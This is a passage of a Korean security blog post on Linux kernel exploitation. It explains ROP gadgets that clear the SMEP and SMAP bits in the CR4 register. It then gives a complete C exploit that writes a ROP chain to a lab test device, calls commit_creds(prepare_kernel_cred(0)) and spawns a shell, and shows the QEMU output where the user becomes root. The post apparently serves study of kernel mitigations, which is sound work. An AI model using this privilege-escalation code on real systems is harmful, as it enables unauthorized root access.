<p>다음과 같은 형태로 vmlinux에서 공격 페이로드를 구성할 가젯을 추출할 수 있었다. 사용자의 입력을 통해 스택에 있는 값을 컨트롤 할 수 있으며 pop 명령어를 통해서 rax에 해당 값을 담는다. 이후 mov cr4, rax를 통해서 rax의 값을 cr4 레지스터에 세팅한다. 이러한 과정이 수행될 경우 SMEP, SMAP을 비활성화된 형태의 state가 되므로 유저 영역의 함수를 실행할 수 있게 된다.</p>
</br>

<h3 id="공격코드-2"><a href="#공격코드-2" class="headerlink" title="공격코드(2)"></a>공격코드(2)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);<br>unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>    rv.user_rip = &amp;shell;<br>&#125;<br><br>void payload(void) &#123;<br>    commit_creds(prepare_kernel_cred(0));<br>    asm(&quot;swapgs;&quot;<br>        &quot;mov %%rsp, %0;&quot;<br>        &quot;iretq;&quot;<br>        : : &quot;r&quot; (&amp;rv));<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[10] = &#123;0, &#125;;<br>    <br>    commit_creds = 0xffffffff8108bed0;<br>    prepare_kernel_cred = 0xffffffff8108c2f0;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = 0xffffffff8197ee5a;     // pop rax; ret;<br>    rop[5] = 0x0006f0;               // SMAP: Disabled | SMEP: Disabled <br>    rop[6] = 0xffffffff810973c0;     // mov cr4, rax; ret;<br>    rop[7] = &amp;payload;<br><br>    write(fd, rop, sizeof(rop));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h3 id="공격결과-2"><a href="#공격결과-2" class="headerlink" title="공격결과(2)"></a>공격결과(2)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ whoami
user
/ $ ./exploit 
/ # whoami
root
/ # 
</code></pre>
<p></br></br></p>
<h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)
DREAMHACK - Linux Kernel Exploit
INFLEARN - 리눅스 커널 해킹. A부터 Z까지
https://www.lazenca.net/pages/viewpage.action?pageId=25624859
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame
</code></pre>
<p></br></br></p>
<h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><pre><code>크래시가 발생한 메모리의 상황에 따라 적절히 페이로드로 구성할 수 있도록 고민하자.
</code></pre>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Research/">Research</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/exploit/">exploit</a>
                    
                      <a class="hover-with-bg" href="/tags/linux/">linux</a>
                    
                      <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                    
                      <a class="hover-with-bg" href="/tags/mitigation/">mitigation</a>
                    
                      <a class="hover-with-bg" href="/tags/smap/">smap</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/10/03/linux-kernel-exploit-bypassing-ssp/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - Bypassing SSP</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/09/30/linux-kernel-exploit-bypassing-smep/">
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - Bypassing SMEP</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
